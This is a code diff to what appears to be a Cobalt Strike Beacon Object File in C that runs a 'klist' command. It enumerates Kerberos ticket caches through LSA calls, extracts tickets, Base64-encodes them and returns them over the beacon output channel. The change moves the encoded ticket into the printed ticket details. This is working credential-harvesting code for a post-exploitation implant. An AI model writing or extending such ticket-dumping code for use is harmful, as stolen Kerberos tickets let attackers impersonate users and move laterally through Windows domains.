@@ -99,18 +99,14 @@ void execute_klist(WCHAR** dispatch, HANDLE hToken, LUID luid, BOOL currentLuid,
             continue;
         }
         int ticketCount = cacheResponse->CountOfTickets;
-//        PRINT(dispatch, "[*] Cached tickets: (%d)", ticketCount);
 // ticket section
         if (ticketCount > 0) {
             for (int j = 0; j < ticketCount; j++) {
                 cacheInfo = cacheResponse->Tickets[j];
- //               PRINT(dispatch, "\t[%d]\n", j);
-                PrintTicketInfo(dispatch, cacheInfo);
                 if (dump) {
                     PUCHAR ticket;
                     ULONG ticketSize;
-                    status = ExtractTicket(hLsa, authPackage, cacheRequest.LogonId, cacheInfo.ServerName, &ticket,
-                                           &ticketSize);
+                    status = ExtractTicket(hLsa, authPackage, cacheRequest.LogonId, cacheInfo.ServerName, &ticket, &ticketSize);
                     if (!NT_SUCCESS(status)) {
                         PRINT(dispatch, "[!] Could not extract the ticket: %ld\n", status);
                     } else {
@@ -122,7 +118,7 @@ void execute_klist(WCHAR** dispatch, HANDLE hToken, LUID luid, BOOL currentLuid,
                                 continue;
                             }
                             Base64encode(encoded, ticket, ticketSize);
-                            BeaconPrintf(CALLBACK_OUTPUT, "Ticket: %s\n", encoded);
+	                    PrintTicketInfo(cacheInfo, encoded);
                             MSVCRT$free(encoded);
                             MSVCRT$free(ticket);
                         }
@@ -130,12 +126,11 @@ void execute_klist(WCHAR** dispatch, HANDLE hToken, LUID luid, BOOL currentLuid,
                 }
             }
         }
-//
         SECUR32$LsaFreeReturnBuffer(cacheResponse);
     }
     MSVCRT$free(sessionData.sessionData);
     SECUR32$LsaDeregisterLogonProcess(hLsa);
-    BeaconPrintf(CALLBACK_OUTPUT, "[!] Finished klist!");
+//    BeaconPrintf(CALLBACK_OUTPUT, "[!] Finished klist!");
 }
 
 NTSTATUS ExtractTicket(HANDLE hLsa, ULONG authPackage, LUID luid, UNICODE_STRING targetName, PUCHAR* ticket, PULONG ticketSize) {
@@ -215,7 +210,7 @@ const char* PrintTicketFlags(ULONG ticketFlags) {
 //    BeaconPrintf(CALLBACK_OUTPUT, "Flags: %s\n", outputFlags);
 }
 
-void PrintTicketInfo(WCHAR** dispatch, KERB_TICKET_CACHE_INFO_EX cacheInfo) {
+void PrintTicketInfo(KERB_TICKET_CACHE_INFO_EX cacheInfo, CHAR* encoded) {
     SYSTEMTIME st_utc = ConvertToSystemtime(cacheInfo.StartTime);
     SYSTEMTIME end_utc = ConvertToSystemtime(cacheInfo.EndTime);
     SYSTEMTIME renew_utc = ConvertToSystemtime(cacheInfo.RenewTime);
@@ -227,12 +222,14 @@ void PrintTicketInfo(WCHAR** dispatch, KERB_TICKET_CACHE_INFO_EX cacheInfo) {
 	"\tEnd Time        : %d/%d/%d %d:%d:%d (UTC)\n"
 	"\tRenew Time      : %d/%d/%d %d:%d:%d (UTC)\n"
 	"\tFlags           :%s\n"
-	"\tEncryption Type : %li\n\n",
+	"\tEncryption Type : %li\n"
+	"\tTicket          : %s\n",
 	GetNarrowStringFromUnicode(cacheInfo.ClientName), GetNarrowStringFromUnicode(cacheInfo.ClientRealm), 
 	GetNarrowStringFromUnicode(cacheInfo.ServerName), GetNarrowStringFromUnicode(cacheInfo.ServerRealm),
 	st_utc.wMonth, st_utc.wDay, st_utc.wYear, st_utc.wHour, st_utc.wMinute, st_utc.wSecond,
 	end_utc.wMonth, end_utc.wDay, end_utc.wYear, end_utc.wHour, end_utc.wMinute, end_utc.wSecond,
 	renew_utc.wMonth, renew_utc.wDay, renew_utc.wYear, renew_utc.wHour, renew_utc.wMinute, renew_utc.wSecond,
         PrintTicketFlags(cacheInfo.TicketFlags),
-	cacheInfo.EncryptionType);
+	cacheInfo.EncryptionType,
+	encoded);
 }
